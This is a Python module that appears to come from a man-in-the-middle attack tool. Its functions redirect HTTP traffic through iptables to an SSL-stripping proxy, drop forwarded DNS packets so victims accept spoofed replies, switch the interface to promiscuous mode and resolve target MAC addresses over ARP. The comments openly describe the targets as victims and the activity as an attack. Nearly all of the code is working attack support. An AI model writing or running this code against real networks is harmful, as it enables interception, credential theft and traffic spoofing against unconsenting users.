import time
import os
import scapy.all as scapy
import subprocess
from . import STATUS, SSL_STRIP_PORT

# Global state tracking for firewall rules and logging silence
IPTABLES_STATE = False 
SILENCE_UNTIL = 0 

def activate_silence_timer():
    """ Called on stop to log once, then mute all output for 4 seconds. """
    global SILENCE_UNTIL
    
    # Manually push the 'Stopped' message before muting the logger
    timestamp = time.strftime('%H:%M:%S')
    msg = f"[{timestamp}] [-] ATTACK STOPPED: Restoring network..."
    
    # Direct append to STATUS buffers since log_msg will be disabled immediately
    if len(STATUS["logs"]) > 100: STATUS["logs"].pop(0)
    STATUS["logs"].append(msg)
    STATUS["all_logs"].append(msg)
    print(msg)

    # Set silence expiration to block subsequent 'ghost' thread logs
    SILENCE_UNTIL = time.time() + 4

def log_msg(message):
    global SILENCE_UNTIL
    
    # Drop log messages if the silence timer is active
    if time.time() < SILENCE_UNTIL:
        return

    timestamp = time.strftime('%H:%M:%S')
    full_msg = f"[{timestamp}] {message}"
    
    # Update ephemeral UI buffer (limited size) and persistent export buffer
    if len(STATUS["logs"]) > 100: STATUS["logs"].pop(0)
    STATUS["logs"].append(full_msg)
    STATUS["all_logs"].append(full_msg)
    
    print(full_msg)

def set_ip_forwarding(value):
    # Enable or disable kernel-level IP forwarding
    try:
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write(str(value))
    except: pass

def set_port_forwarding(enable):
    global IPTABLES_STATE
    
    # Skip operation if in silence mode to avoid cluttering logs during shutdown
    if time.time() < SILENCE_UNTIL: return

    try:
        if enable:
            if IPTABLES_STATE: return 
            # 
            # Redirect TCP port 80 traffic to our SSL Strip proxy port
            cmd = f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[NET] Traffic Redirection: ENABLED (Port 80 -> {SSL_STRIP_PORT})")
            IPTABLES_STATE = True
        else:
            if not IPTABLES_STATE: return 
            # Remove the redirection rule to restore normal traffic flow
            cmd = f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
            os.system(cmd)
            log_msg(f"[SYSTEM] IP Tables rule REMOVED for SSL Strip.")
            IPTABLES_STATE = False
    except Exception as e:
        log_msg(f"[!] IP Tables Error: {e}")

def set_dns_blocking(enable):
    try:
        if enable:
            # Drop legitimate DNS packets to force victims to accept our spoofed responses
            rule = f"iptables -I FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding BLOCKED (Force Fake Response)")
        else:
            # Remove the DROP rule to restore normal DNS resolution
            rule = f"iptables -D FORWARD -i {STATUS['interface']} -p udp --dport 53 -j DROP"
            os.system(rule)
            log_msg("[SYSTEM] DNS Forwarding Restored")
    except Exception as e:
        log_msg(f"[!] DNS Rules Error: {e}")

def set_promiscuous_mode(interface, enable):
    try:
        if os.geteuid() != 0: return 
        action = "promisc" if enable else "-promisc"
        
        # 
        # Attempt to toggle mode using 'ip' command, falling back to 'ifconfig'
        if os.path.exists('/sbin/ip') or os.path.exists('/usr/sbin/ip') or os.path.exists('/bin/ip'): 
            subprocess.run(['ip', 'link', 'set', interface, action, 'on' if enable else 'off'], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif os.path.exists('/sbin/ifconfig'): 
            subprocess.run(['ifconfig', interface, action], check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if enable:
            log_msg(f"[+] Interface {interface} set to Promiscuous Mode.")
    except Exception as e:
        log_msg(f"[!] Warning: Could not set Promiscuous Mode: {e}")

def get_mac(ip):
    try:
        # Broadcast ARP Request to resolve IP to MAC address
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list = scapy.srp(broadcast/arp_request, timeout=1, verbose=False, iface=STATUS["interface"])[0] 
        return answered_list[0][1].hwsrc if answered_list else None
    except: return None